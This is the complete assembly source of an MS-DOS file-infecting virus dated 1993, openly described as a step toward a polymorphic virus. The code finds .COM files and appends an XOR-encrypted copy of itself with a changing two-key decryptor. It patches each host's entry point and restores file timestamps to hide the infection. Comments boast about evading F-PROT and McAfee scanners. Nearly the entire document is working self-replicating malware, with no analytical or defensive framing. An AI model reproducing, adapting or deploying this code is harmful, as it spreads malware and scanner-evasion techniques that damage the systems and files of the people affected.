

;****************************************************************************
;
; K™HNTARK-9.ASM  
; written by Z‰b‰hn Stra‹n D‰ Geustaah
; Date: 31 March 1993
; No INT 03 hooks!, constanly changing en/decrypting  2 key XOR routine 
; 3rd different exit routine using rep movs. Tighter code.. lea's
; No 1st generation checking code. START_CODE moved at end of file
;
; Transition to polymorphic virus
;
;****************************************************************************


MAIN    SEGMENT BYTE
        ASSUME cs:main,ds:main,ss:nothing  ;all parts in code segment=com file
        ORG    100h

;**********************************
;  fake host program
;**********************************

HOST:
        db     0E9h,08,00         ;jmp    NEAR PTR VIRUS, FUCKING TASM!
        db     '  ' 
        mov    ah,4CH
        mov    al,0
        int    21H                 ;terminate normally with dos

;****************************************************************************
; VIRUS CODE STARTS HERE
; everything from here is encrypted when 
; written to host
;****************************************************************************

 VIRUS:                            ;a label for the first byte of the virus   
            call GET_START
            GET_START:
                      pop si                                 ;get absolute
                      sub si,OFFSET GET_START - OFFSET VIRUS ;address 

;************************************************
; redirect DTA onto virus code
;************************************************
           
           lea  dx,[si + OFFSET DTA - OFFSET VIRUS] ;load effective address
                                ;put DTA at the end of the virus for now
                                ;cos command line options are stored there
                                ;and you want to save them.
           mov  ah,1ah          ;set new DTA function
           int  21h

;************************************
; Routines called from here           
;************************************

           call RANDOM_KEY_CHANGE ;change encrypting key randomly
           call FIND_FILE         ;get a com file to attack!
           jnz  EXIT_VIRUS        ;returned non-zero, no file to infect.. exit
           call INFECT            ;found file? infect it!
           
           lea  dx,[si + OFFSET FNAME - OFFSET VIRUS] 
                                 ;display the name of the file NOT
           mov  BYTE PTR [si + OFFSET HANDLE - OFFSET VIRUS],24H    
                                 ;make sure string terminates,put $ after it
           mov  ah,09
           int  21h             ;display file name

;****************************************************************************
EXIT_VIRUS:

;************************************           
; set old  DTA  address
;************************************

           mov ah,1ah
           mov dx,80h            ;fix dta back to return control to
           int 21h               ;host program

;************************************           
; restore 5 original bytes to file
;************************************
           
           cld                                     ;set direction flag to frwd 
           push si                                 ;save virus'starting address
           mov cx,5                                ;#of bytes to move
           add si,OFFSET START_CODE - OFFSET VIRUS ;move string from here
           mov di,OFFSET HOST                      ;to here
           rep movsb                               ;move string
           pop si                                  ;restore virus ' address

;************************************************************************
; zero out registers for return to
; host program
;************************************************************************
 
 mov  si, OFFSET 100h     ;fools F-PROT 2.07 and does the job
 and  bx,0000             ;don't worry about Mcaffe's SCAN.. it sucks!!
 and  ax,0000
 push si  
 and  dx,0000
 and  si,0000
 and  di,0000
 ret  0FFFFh

;***************************************************************************

FIND_FILE:
                
                lea dx,[si + OFFSET COM_FILES - OFFSET VIRUS ]
                mov ah,4eh   ;do DOS search 1st function
                mov cx,3fh   ;search for any file, with any attributes
                int 21h

FF_LOOP:
                or   al,al        ;al = return from int 21h search function
                jnz  FF_DONE      ;return if not zero
                call CHECK_FILE   ;check file if file found
                jz   FF_DONE      ;file OK.. exit with a zero
                mov  ah,4fh       ;file no good..find next function
                int  21h
                jmp  FF_LOOP      ;test next file for validity

FF_DONE:
                ret

;****************************************************************************
; determine if com file is useful
; 1-bytes 0 ,3, 4 of file are not a near jmp code and ' ', ' ' .
; 2-there is enough space for the virus without going over 64K
; RETURNS AL


CHECK_FILE:

            lea  dx,[si + OFFSET FNAME - OFFSET VIRUS];open the file      
            mov  ax,3d00h                             ;al=0 =>read access to it
            int  21h

            jc   NO_GOOD                   ;error opening file.. quit & return nz
            mov  bx,ax                     ;put file handle in bx
            push bx                        ;save handle into stack
            mov  cx,5                      ;read first 5 bytes of file
            
            lea  dx,[si + OFFSET START_IMAGE - OFFSET VIRUS]  
                                           ;store'em here
            mov  ah,3fh                    ;DOS read function
            int  21h

            pop  bx                        ;restore file handle
            mov  ah,3eh
            int  21h                       ;close file handle

            mov  ax,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]                  
                                                      ;get file's size
            add  ax,OFFSET FINAL - OFFSET VIRUS    ;add virus size to it
            jc   NO_GOOD                              ;bigger then 64K:nogood

            
            cmp  WORD PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],'MZ'
            je   NO_GOOD                         ;look for EXE files disguised as COM
            
            cmp  WORD PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],'ZM'
            je   NO_GOOD                         ;look for DOS 5.0 new executables

            cmp  WORD PTR [si + OFFSET START_IMAGE+3 - OFFSET VIRUS],2020h  
                                                 ;check for ' ',' ' in pos 3 & 4
            jnz  GOOD                            ;file ok .. infect
            
            cmp  BYTE PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],0E9h     
                                                 ;compare 1st byte to near jmp
            jnz  GOOD                            ;not a near jmp, file ok

NO_GOOD:
            mov  al,1             ;don't infect this file
            or   al,al            ;return a z reset
            ret

GOOD:
            xor  al,al            ;al=0 ok to infect, return with z reset

            ret

;****************************************************************************
; This routine moves the virus to the end of the COM file
; and adjusts the 5 bytes at the start of the program and the 5 bytes stored
; in memory

INFECT:

;*********************************************        
; 1- Open file found for infection
;*********************************************


        lea  dx,[si + OFFSET FNAME - OFFSET VIRUS];get filename
        mov  ax,3d02h                             ;DOS function
        int  21h                                  ;open file for r/w access
        
        mov  WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS],ax ;save file handle
 
;*********************************************        
; 2-Save date and time of file to be infected
;*********************************************

        mov  ax,5700h
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
        int  21h
        mov  WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS],dx
        mov  WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS],cx


;*********************************************
; 3- Goto EOF
;*********************************************

        xor  cx,cx                  ;prepare to write virus on file
        mov  dx,cx                  ;position file pointer,cx:dx = 0
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
                                    ;bx = file handle
        mov  ax,4202H               ;DOS interrupt
        int  21h                    ;locate pointer at end EOF DOS function


;****************************************************************
; 4- Write Constant decrypting routine, only 10 constant bytes!
;    possible future implementation:
;    change order of little segments of code
;    shuffle instructions around etc.
;****************************************************************

   mov  bx,si ;???               
   mov  ax,100h
   add  ax,WORD PTR [si+OFFSET FSIZE-OFFSET VIRUS]  ;file size in ax             
   add  ax,19d                                      ;add size of decrypt routine
        
   mov  WORD PTR [si + OFFSET BUFFER1 - OFFSET VIRUS + 1],ax ;address to start decrypting from

   mov  ax,(OFFSET FINAL - OFFSET VIRUS)/2  ;size of encrypted code / 2
   mov  WORD PTR [si + OFFSET BUFFER1 - OFFSET VIRUS + 4],ax ;because we are decrypting
                                                             ;words instead of bytes
        
   mov  ax,[si + OFFSET KEY1 - OFFSET VIRUS]                 ;put key1 in buffer
   mov  WORD PTR [si + OFFSET BUFFER1 - OFFSET VIRUS + 7],ax
        
   mov  ax,[si + OFFSET KEY2 - OFFSET VIRUS]                 ;put key2 in buffer
   mov  WORD PTR [si + OFFSET BUFFER1 - OFFSET VIRUS + 15],ax


        mov  cx,19d                                     ;write this many bytes, length of buffer
        lea  dx,[si+ OFFSET BUFFER1 - OFFSET VIRUS]     ;write from here
        mov  bx,WORD PTR[si+OFFSET HANDLE-OFFSET VIRUS] ;restore file handle
        mov  ah,40h
        int  21h                                        ;write part
        
;***********************************************
; 5- encrypt and write the rest of the  virus
;    one byte at the time
;***********************************************
        
        lea  dx,[si + OFFSET TEMP - OFFSET VIRUS] ;address of variable to put code

        lea  bx,[si]   ;address of code to encrypting here  
        mov  di,WORD PTR [si + OFFSET KEY1 - OFFSET VIRUS] ;put key in di
        
  loop2:
        mov  ax,WORD PTR [bx]  ;put contents of memory into ax
        xor  ax,di             ;encrypt word, di = key
        mov  WORD PTR [si + OFFSET TEMP - OFFSET VIRUS],ax  ;put word in variable
        add  di,[si + OFFSET KEY2 - OFFSET VIRUS]           ;increase key!!
        
        xor  ax,ax
        push bx                                    ;save location in memory
        
        mov  bx,WORD PTR[si + OFFSET HANDLE - OFFSET VIRUS] ;restore file handle
        mov  cx,02h ;write this many bytes at each call
        mov  ah,40h
        int  21h    ;write byte from TEMP to file
        
        pop  bx     ;restore memory address to encrypt
        inc  bx     ;increase address to do next word
        inc  bx
        
        mov  ax,si                           ;get 
        add  ax,OFFSET FINAL - OFFSET VIRUS  ;absolute address of end of virus
        cmp  bx,ax                           ;done?
        jle  loop2                           ;if not do next byte
        xor  di,di
        xor  bp,bp

;***********************************************
; 6- position pointer where START_CODE is
;    in newly infected file
;***********************************************

     mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS] ;bx=file handle
     xor  cx,cx                 
     mov  dx,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]
     add  dx,OFFSET START_CODE - OFFSET VIRUS + 19d 
                                                  ;+19 bytes of decrypting code 
                                                  ;address where START_CODE is
                                                  ;is in written file
     mov  ax,4200h  ;method al=0 from front of file
     int  21h       ;position pointer at cx:dx, dx=displacement


;***********************************************************************
; 7- write 5 first bytes of file to be infected located in START_IMAGE
;    (put there by CHECK_FILE) into file to be infected at
;    START_CODE (at the end of the file)
;************************************************************************

        
        mov  cx,5                            ;# of bytes to write
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]            
                                             ;bx = file handle
        mov  dx,si
        add  dx,OFFSET START_IMAGE - OFFSET VIRUS  
                                             ;place in memory to write from
        mov  ah,40h                          ;info obtained in CHECK_FILE function
        int  21h                             ;write 5 bytes

;***********************************************
; 8- position pointer at start of file to be
;    infected 
;***********************************************

        xor  cx,cx                           ;cx=0
        mov  dx,cx                           ;position file pointer,cx:dx = 0
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]         
                                             ;bx = file handle
        mov  ax,4200h                        ;method:al=0 => from start of file
        int  21h                             


;********************************************************
; 9- move jump + address + virus ID into START_IMAGE
;    to be written to beginning of  file to be infected
;********************************************************
        
        mov  bx,si
        mov  BYTE PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],0E9h
        mov  ax,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]
       ;add  ax,OFFSET VIRUS - OFFSET VIRUS-3
        sub  ax,3                               ;calculate return jmp address
        mov  WORD PTR [si + OFFSET START_IMAGE+1 - OFFSET VIRUS],ax
        mov  WORD PTR [si + OFFSET START_IMAGE+3 - OFFSET VIRUS],2020h


;********************************************************
; 10- write 5 bytes from START_IMAGE to the beginning of  
;    the file to be infected
;********************************************************

        mov  cx,5                               ;#of bytes to write
        lea  dx,[si + OFFSET START_IMAGE - OFFSET VIRUS]
                                                ;ds:dx=pointer of data to write
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]               
                                                ;bx = file handle
        mov  ah,40h                             ;DOS write function
        int  21h                                ;write 5 bytes

;*************************************************        
; 11-Restore date and time of file to be infected
;*************************************************

        mov  ax,5701h
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
        mov  dx,WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS]
        mov  cx,WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS]
        int 21h

        ret                                     ;infection done!

;****************************************************************************

RANDOM_KEY_CHANGE:

;***********************************************************
; this procedure changes the encrypting keys
; using the BIOS time interrupt 1ah
; registers changed: ax,dx,cx
;***********************************************************

           mov ah,00h  ; get time BIOS -> cx=high clock count dx=low clock count
try_again:
           int 1ah     ;al =0 timer has not passed 24 hour count al=1 it has
   
           mov WORD PTR [si + OFFSET KEY1 - OFFSET VIRUS],dx ;change key
     
           int 1ah
           cmp dx,0000h                            ;dx= 0?
           je  try_again                           ;if so get new time values

           mov WORD PTR [si + OFFSET KEY2 - OFFSET VIRUS],dx ;change key2
           ret

;****************************************************************************

BUFFER1:    db  0BBh,00,00      ;mov bx,0000 => address to start decrypting from
            db  0B9h,00,00      ;mov cx 0000 => # of bytes to decrypt
            db  0BAh,00,00      ;mov dx 0000 => KEY1
            db  031h,017h       ;xor WORD PTR [bx],dx
            db  043h,043h       ;inc bx inc bx
            db  081h,0C2h,00,00 ;add dx,0000 => KEY2
            db  0E2h,0F6h       ;loop to xor

COM_FILES   db  '*.COM',0 
DTA         db  1Ah dup (?)                   
FSIZE       dw  0,0                ;file size storage area
FNAME       db  13 dup (?)         ;area for file path
HANDLE      dw  0                  ;file handle
START_IMAGE db  0,0,0,0,0          ;area to store 5 bytes to w/r from / to file
VSTACK      dw  28h dup (?)        ;stack for virus program (40 bytes)
TEMP        db  0
F_DATE      dw  0,0
F_TIME      dw  0,0
key1        dw 0000
key2        dw 0000 

;****************************************************************************

FINAL:               ;label of byte of code to be kept in virus when it moves

;****************************************************************************

START_CODE:                        ;first 5 bytes of host program go here
           nop                     ;this part always remains unencrypted
           nop                     ;
           nop
           nop
           nop

;****************************************************************************

;vienna code to cause reboot: in hex EA F0 FF 00 F0

MAIN ENDS
     END    HOST

